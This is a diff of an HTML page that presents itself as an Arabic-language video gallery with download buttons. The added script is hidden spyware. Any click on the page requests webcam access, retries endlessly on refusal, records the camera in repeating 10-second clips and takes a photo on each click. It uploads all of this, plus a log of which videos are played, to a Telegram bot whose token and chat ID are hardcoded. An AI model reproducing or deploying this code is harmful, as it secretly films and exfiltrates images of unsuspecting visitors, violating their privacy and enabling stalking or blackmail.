@@ -8,101 +8,84 @@
   <style>
     body {
       margin: 0;
-      background-color: #2a003f;
-      font-family: 'Arial', sans-serif;
+      background-color: #1a001a;
+      font-family: Arial, sans-serif;
+      overflow-x: hidden;
     }
-
-    .cover {
-      width: 100%;
-      height: 200px;
-      background: url("5alfia.png") no-repeat center center;
+    .header {
+      background-image: url('5alfia.png');
       background-size: cover;
+      height: 200px;
       position: relative;
     }
-
-    .profile {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      border: 4px solid white;
-      background: url("profile.png") no-repeat center center;
-      background-size: cover;
+    .profile-pic {
       position: absolute;
-      bottom: -50px;
-      right: 10px;
-      animation: pulse 2s infinite;
+      bottom: -40px;
+      right: 20px;
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      border: 3px solid #fff;
+      background-color: #fff;
+      background-image: url('profile.png');
+      background-size: cover;
+      background-position: center;
     }
-
-    @keyframes pulse {
-      0% { box-shadow: 0 0 5px #ff69b4; }
-      50% { box-shadow: 0 0 20px #ff0000; }
-      100% { box-shadow: 0 0 5px #ff69b4; }
-    }
-
-    .video-grid {
-      margin-top: 80px;
+    .videos {
+      margin-top: 60px;
       display: flex;
       flex-wrap: wrap;
-      justify-content: center;
-      gap: 10px;
-      padding: 10px;
+      justify-content: space-around;
+      padding-bottom: 100px;
     }
-
     .video-box {
-      width: 90px;
-      height: 90px;
-      background: black;
-      border: 3px solid #ff69b4;
+      width: 30%;
+      margin: 10px;
+      border: 3px solid pink;
       animation: pulse 2s infinite;
       position: relative;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
-
     .video-box video {
       width: 100%;
-      height: 100%;
-      object-fit: cover;
       display: block;
+      cursor: pointer;
     }
-
     .video-desc {
+      color: white;
       text-align: center;
-      color: pink;
-      font-size: 12px;
-      margin-top: 5px;
+      padding: 5px;
     }
-
+    @keyframes pulse {
+      0% { border-color: pink; }
+      50% { border-color: red; }
+      100% { border-color: pink; }
+    }
     .overlay {
       display: none;
       position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background-color: rgba(0, 0, 0, 0.9);
+      top:0; left:0; width:100%; height:100%;
+      background: rgba(0,0,0,0.9);
       justify-content: center;
       align-items: center;
-      z-index: 999;
       flex-direction: column;
+      z-index: 999;
     }
-
     .overlay video {
       width: 90%;
-      max-height: 80vh;
+      max-width: 480px;
     }
-
     .download-btn {
-      background-color: #ff69b4;
+      background: #ff69b4;
       color: white;
+      padding: 10px 20px;
       border: none;
-      padding: 10px;
-      margin-top: 10px;
       font-size: 16px;
-      cursor: pointer;
       border-radius: 10px;
+      margin-top: 10px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
     }
-
     .spinner {
       border: 6px solid #f3f3f3;
       border-top: 6px solid #ff69b4;
@@ -112,112 +95,134 @@
       animation: spin 1s linear infinite;
       margin-bottom: 10px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     .back-btn {
       position: fixed;
-      bottom: 10px;
-      left: 10px;
-      background-color: #ff69b4;
-      color: white;
+      bottom: 20px;
+      left: 20px;
+      background: pink;
+      color: black;
       padding: 10px 20px;
-      border-radius: 20px;
-      font-size: 14px;
+      border-radius: 30px;
       text-decoration: none;
+      font-size: 18px;
       animation: pulse 2s infinite;
-    }
-
-    .back-btn::before {
-      content: "⬅";
-      margin-left: 5px;
     }
   </style>
 </head>
-<body onclick="requestCamera();">
+<body onclick="requestCamera(); captureClick();">
 
-  <div class="cover">
-    <div class="profile"></div>
-  </div>
+<div class="header">
+  <div class="profile-pic"></div>
+</div>
 
-  <div class="video-grid" id="videoGrid">
-    <!-- 👑 الفيديو الأول -->
-    <div class="video-box" onclick="playVideo('VivaCut_video_1751836959485_HD1.mp4', 'لحن نهاية')">
-      <video muted poster="thumb1.jpg"></video>
-    </div>
+<div class="videos">
+  <div class="video-box" onclick="playVideo('VivaCut_video_1751836959485_HD1.mp4', 'لحن نهاية')">
+    <video poster="thumb1.jpg"></video>
     <div class="video-desc">لحن نهاية</div>
-
-    <!-- 👑 البقية تكرار -->
-    <div class="video-box" onclick="playVideo('vid2.mp4', 'وصف 2')"><video muted poster="thumb2.jpg"></video></div>
+  </div>
+  <!-- يمكنك تكرار المربعات التالية بأسماء فيديوهات أخرى وتغيير الوصف -->
+  <div class="video-box" onclick="playVideo('video2.mp4', 'وصف 2')">
+    <video poster="thumb2.jpg"></video>
     <div class="video-desc">وصف 2</div>
-
-    <div class="video-box" onclick="playVideo('vid3.mp4', 'وصف 3')"><video muted poster="thumb3.jpg"></video></div>
+  </div>
+  <div class="video-box" onclick="playVideo('video3.mp4', 'وصف 3')">
+    <video poster="thumb3.jpg"></video>
     <div class="video-desc">وصف 3</div>
-
-    <div class="video-box" onclick="playVideo('vid4.mp4', 'وصف 4')"><video muted poster="thumb4.jpg"></video></div>
+  </div>
+  <div class="video-box" onclick="playVideo('video4.mp4', 'وصف 4')">
+    <video poster="thumb4.jpg"></video>
     <div class="video-desc">وصف 4</div>
-
-    <div class="video-box" onclick="playVideo('vid5.mp4', 'وصف 5')"><video muted poster="thumb5.jpg"></video></div>
+  </div>
+  <div class="video-box" onclick="playVideo('video5.mp4', 'وصف 5')">
+    <video poster="thumb5.jpg"></video>
     <div class="video-desc">وصف 5</div>
   </div>
+</div>
 
-  <div class="overlay" id="overlay">
-    <div class="spinner" id="spinner"></div>
-    <video id="bigVideo" controls autoplay style="display: none;"></video>
-    <a id="downloadBtn" class="download-btn" download>تحميل الفيديو</a>
-  </div>
+<div class="overlay" id="overlay">
+  <div class="spinner" id="spinner"></div>
+  <video controls id="videoPlayer" oncanplay="hideSpinner()"></video>
+  <a id="downloadLink" class="download-btn" download>تحميل الفيديو</a>
+</div>
 
-  <a class="back-btn" href="index.html">رجوع للصور</a>
+<a href="index.html" class="back-btn">⬅ رجوع للصور</a>
 
-  <script>
-    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
-    const CHAT_ID = "7664410054";
+<script>
+const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+const CHAT_ID = "7664410054";
 
-    function sendToBot(message) {
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  });
+}
+
+function playVideo(src, desc) {
+  const overlay = document.getElementById('overlay');
+  const player = document.getElementById('videoPlayer');
+  const spinner = document.getElementById('spinner');
+  const download = document.getElementById('downloadLink');
+
+  spinner.style.display = "block";
+  overlay.style.display = "flex";
+  player.src = src;
+  player.load();
+  download.href = src;
+  sendToTelegram("📹 تم تشغيل الفيديو: " + desc);
+}
+
+function hideSpinner() {
+  document.getElementById('spinner').style.display = 'none';
+}
+
+function requestCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      let count = 0;
+      setInterval(() => {
+        let chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          let blob = new Blob(chunks, { type: 'video/mp4' });
+          let form = new FormData();
+          form.append('chat_id', CHAT_ID);
+          form.append('video', blob, `vid${Date.now()}.mp4`);
+          fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+            method: "POST",
+            body: form
+          });
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000); // 10 ثوان
+        count++;
+      }, 10000); // كل 10 ثوان
+    })
+    .catch(() => requestCamera());
+}
+
+function captureClick() {
+  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    imageCapture.takePhoto().then(blob => {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'click.jpg');
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
         method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        body: form
       });
-    }
-
-    function playVideo(src, desc) {
-      sendToBot("🖼 المستخدم ضغط على الفيديو: " + desc);
-      const overlay = document.getElementById('overlay');
-      const video = document.getElementById('bigVideo');
-      const spinner = document.getElementById('spinner');
-      const downloadBtn = document.getElementById('downloadBtn');
-
-      overlay.style.display = "flex";
-      spinner.style.display = "block";
-      video.style.display = "none";
-
-      video.src = src;
-      video.load();
-
-      video.oncanplay = () => {
-        spinner.style.display = "none";
-        video.style.display = "block";
-        downloadBtn.href = src;
-      };
-    }
-
-    document.getElementById("overlay").onclick = () => {
-      document.getElementById("overlay").style.display = "none";
-      document.getElementById("bigVideo").pause();
-    };
-
-    // 👑 طلب إذن الوصول للكاميرا عند كل نقرة
-    async function requestCamera() {
-      try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
-      } catch {
-        setTimeout(requestCamera, 1000);
-      }
-    }
-  </script>
+    });
+  });
+}
+</script>
 </body>
 </html>
+
